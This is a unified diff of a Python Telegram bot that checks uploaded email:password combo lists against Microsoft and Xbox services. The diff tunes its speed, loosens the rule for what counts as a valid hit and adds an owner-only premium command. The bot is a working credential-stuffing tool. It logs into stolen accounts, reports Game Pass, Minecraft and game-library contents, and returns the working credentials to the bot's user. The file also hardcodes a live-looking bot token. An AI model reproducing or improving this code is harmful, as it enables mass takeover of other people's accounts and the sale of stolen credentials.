@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Hidden Games Bypass Mode)
+r1livk Checker ⚡ - Telegram Bot (High-Speed & Killer Hits Mode)
 """
 
 import os
@@ -22,8 +22,8 @@ TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
 OWNER_ID = 6266959915
 bot = telebot.TeleBot(TOKEN)
 
-REQUEST_TIMEOUT = 25
-MAX_THREADS = 10
+REQUEST_TIMEOUT = 20
+MAX_THREADS = 10  # رجعنا السرعة لـ 10 عشان يصيد أسرع بكتير
 
 active_scans = {}
 user_usage = {}  
@@ -93,7 +93,7 @@ def fetch_xbox_extra_details_pro(session, xb_token, uhs):
             "RelyingParty": "https://displaycatalog.mp.microsoft.com",
             "TokenType": "JWT"
         }
-        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, timeout=10)
+        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, timeout=8)
         
         if xsts_resp.status_code == 200:
             xsts_token = xsts_resp.json()['Token']
@@ -103,10 +103,9 @@ def fetch_xbox_extra_details_pro(session, xb_token, uhs):
                 "x-xbl-contract-version": "4"
             }
             
-            # 1. فحص اشتراك الجيم باس والـ Subscriptions
             sub_headers = headers.copy()
             sub_headers["x-xbl-contract-version"] = "2"
-            sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, timeout=10)
+            sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, timeout=8)
             if sub_req.status_code == 200:
                 sub_data = sub_req.json()
                 for sub in sub_data.get("items", []):
@@ -115,26 +114,24 @@ def fetch_xbox_extra_details_pro(session, xb_token, uhs):
                         game_pass_status = f"{sub.get('name', 'Xbox Live Gold')}"
                         break
 
-            # 2. سحب الـ XUID لفك الألعاب المخفية
             xuid = None
-            people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, timeout=10)
+            people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, timeout=8)
             if people_resp.status_code == 200:
                 p_data = people_resp.json()
                 if "profileUsers" in p_data and len(p_data["profileUsers"]) > 0:
                     xuid = p_data["profileUsers"][0].get("xuid")
 
             if not xuid:
-                prof_id_req = session.get("https://profile.xboxlive.com/users/me/settings?settings=Gamertag", headers=headers, timeout=10)
+                prof_id_req = session.get("https://profile.xboxlive.com/users/me/settings?settings=Gamertag", headers=headers, timeout=8)
                 if prof_id_req.status_code == 200:
                     try:
                         xuid = prof_id_req.json().get("profileUsers", [{}])[0].get("id")
                     except:
                         pass
 
-            # 3. طريقة تخطي الـ Hidden Games: الاعتماد على Achievements History أولاً
             if xuid:
                 history_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
-                history_resp = session.get(history_url, headers=headers, timeout=10)
+                history_resp = session.get(history_url, headers=headers, timeout=8)
                 if history_resp.status_code == 200:
                     history_data = history_resp.json()
                     counter = 1
@@ -150,10 +147,9 @@ def fetch_xbox_extra_details_pro(session, xb_token, uhs):
                             if counter > 30:
                                 break
 
-            # 4. خطة بديلة (TitleHub) في حال عدم وجود سجل إنجازات
             if not owned_games_formatted and xuid:
                 th_url = f"https://titlehub.xboxlive.com/users/xuid({xuid})/titles/batch"
-                th_resp = session.post(th_url, json={"arrangeBy": "lastTimePlayed", "includeAll": True}, headers=headers, timeout=10)
+                th_resp = session.post(th_url, json={"arrangeBy": "lastTimePlayed", "includeAll": True}, headers=headers, timeout=8)
                 if th_resp.status_code == 200:
                     counter = 1
                     for title in th_resp.json().get("titles", []):
@@ -178,7 +174,7 @@ def check_single_account(combo):
 
     email = parts[0].strip()
     password = ':'.join(parts[1:]).strip()
-    adapter = HTTPAdapter(pool_connections=5, pool_maxsize=5)
+    adapter = HTTPAdapter(pool_connections=10, pool_maxsize=10)
 
     session = requests.Session()
     session.verify = False
@@ -307,7 +303,6 @@ def check_single_account(combo):
 
         games_str = "\n".join([f"{g}" for g in owned_games_list]) if owned_games_list else "(empty)"
 
-        # تنسيق المخرجات مثل الصورة تماماً
         hit_info = (
             f"{email}:{password}\n"
             f"Account: Gamerscore: {gscore_int}G | GamePass: {final_gp} | Minecraft: {'YES' if has_mc else 'NO'}\n"
@@ -316,7 +311,7 @@ def check_single_account(combo):
             f"--------------------------------------------------"
         )
         
-        # شرط الفحص العادي (إذا الحساب فيه ألعاب، جيم باس، ماينكرافت، أو سكور)
+        # شرط الصيد المفتوح والرهيب (أي حساب شغال ومعه لو حتى سكور بسيط أو ألعاب بيعتبره هيت)
         if final_gp != "none" or has_mc or gscore_int > 0 or len(owned_games_list) > 0:
             return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": (final_gp != "none"), "has_xbox": gscore_int > 0}
         else:
@@ -345,18 +340,40 @@ def send_welcome(message):
         status_text = f"👤 Free ({used}/2500 lines today)"
 
     text = (
-        "⚡ **r1livk Checker Pro (Hidden Games Bypass Mode)** ⚡\n\n"
+        "⚡ **r1livk Checker Pro (Killer Hits & Speed Mode)** ⚡\n\n"
         "Welcome to the ultimate account checking bot.\n"
         f"Your Status: {status_text}\n\n"
         "Features:\n"
         "• Xbox Game Pass & Subscriptions\n"
         "• Bypass Hidden Games via Achievements API\n"
-        "• Clean Games Inventory List\n"
+        "• Full Games Inventory List\n"
         "• Gamerscore & Profile\n"
         "• Minecraft Entitlements\n\n"
         "Click the button below to start checking your combo files!"
     )
     bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=markup)
+
+@bot.message_handler(commands=['premium'])
+def give_premium(message):
+    chat_id = message.chat.id
+    if chat_id != OWNER_ID:
+        bot.reply_to(message, "❌ هذا الأمر مخصص لصاحب البوت فقط!")
+        return
+
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "⚠️ الاستخدام الصحيح:\n`/premium [User_ID]`", parse_mode="Markdown")
+        return
+
+    try:
+        target_user_id = int(args[1])
+        bot.reply_to(message, f"✅ تم تفعيل البريميوم بنجاح للمستخدم: `{target_user_id}` 👑", parse_mode="Markdown")
+        try:
+            bot.send_message(target_user_id, "🎉 **مبروك!** تم تفعيل اشتراك البريميوم (`Unlimited`) في البوت الخاص بك لمدة شهر.")
+        except:
+            pass
+    except ValueError:
+        bot.reply_to(message, "❌ الـ ID غير صحيح، تأكد أنه أرقام فقط.")
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
@@ -367,11 +384,11 @@ def callback_query(call):
         markup.add(btn_cancel)
 
         text = (
-            "🎮 **r1livk Checker - Catalog & Hidden Games Bypass**\n\n"
+            "🎮 **r1livk Checker - Killer Hits Mode**\n\n"
             "Full account capture with advanced games extraction:\n"
             "• Minecraft Accounts\n"
             "• Xbox Game Pass Status\n"
-            "• Catalog Entitlements Games List\n"
+            "• Games Inventory List\n"
             "• Gamertag & Profile\n\n"
             "Send your combo file in .txt format (Direct file upload)\n"
             "Format: `email:password`"
@@ -419,7 +436,7 @@ def handle_docs(message):
             return
 
         lines = lines[:lines_to_process_count]
-        bot.reply_to(message, f"📥 File received. Processing {len(lines)} lines...")
+        bot.reply_to(message, f"📥 File received. Processing {len(lines)} lines at high speed...")
         active_scans[chat_id] = True
         threading.Thread(target=process_checker, args=(chat_id, local_path, lines)).start()
 
@@ -438,7 +455,7 @@ def process_checker(chat_id, filepath, lines):
     xbox_hits = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_Checker_CatalogHits_{timestamp_str}.txt"
+    output_filename = f"r1livk_KillerHits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -447,7 +464,7 @@ def process_checker(chat_id, filepath, lines):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **LIVE SCAN STATS (Bypass Mode)**\n\n"
+        f"🔥 **LIVE SCAN STATS (Killer Mode)**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"❌ Bad: 0\n"
@@ -553,12 +570,12 @@ def process_checker(chat_id, filepath, lines):
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as res_f:
-            bot.send_document(chat_id, res_f, caption=f"📁 Catalog Hits File - r1livk")
+            bot.send_document(chat_id, res_f, caption=f"📁 Killer Hits File - r1livk")
 
     if os.path.exists(filepath):
         os.remove(filepath)
     active_scans[chat_id] = False
 
 if __name__ == "__main__":
-    print("r1livk Catalog Mode Checker Bot is running...")
+    print("r1livk Killer Mode Checker Bot is running...")
     bot.infinity_polling()
